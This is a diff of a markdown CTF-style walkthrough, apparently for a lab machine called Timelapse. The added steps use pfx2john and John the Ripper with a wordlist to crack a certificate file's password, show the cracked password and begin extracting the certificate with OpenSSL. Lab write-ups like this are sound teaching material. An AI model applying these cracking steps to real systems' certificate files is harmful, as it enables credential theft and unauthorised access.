@@ -123,8 +123,27 @@ Session completed.
 ```
 ![capture-5](capture-5.PNG)
 
-Next, we need to extract the cert and pem from the pfx file.
-Using OpenSSL, we can extract this information with the password extracted from earlier.
+Once we have unlocked the zip file, the pfx file is also password protected, we can use pfx2john to crack the password again.
+```
+┌──(tsunami㉿coffee)-[~/Documents/timelapse]
+└─$ pfx2john legacyy_dev_auth.pfx > pfx_hash.txt
+                                                                                                                                           
+┌──(tsunami㉿coffee)-[~/Documents/timelapse]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:48 11.10% (ETA: 02:22:06) 0g/s 36728p/s 36728c/s 36728C/s greenRING3..grapekey924
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:01:20 DONE (2025-07-12 02:16) 0.01242g/s 40156p/s 40156c/s 40156C/s thugways..thugers1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+![capture-7](capture-7.PNG)
+With the password for the pfx file obtained, we have to extract the cert and key from it.
 ```
 ┌──(tsunami㉿coffee)-[~/Documents/timelapse]
 └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
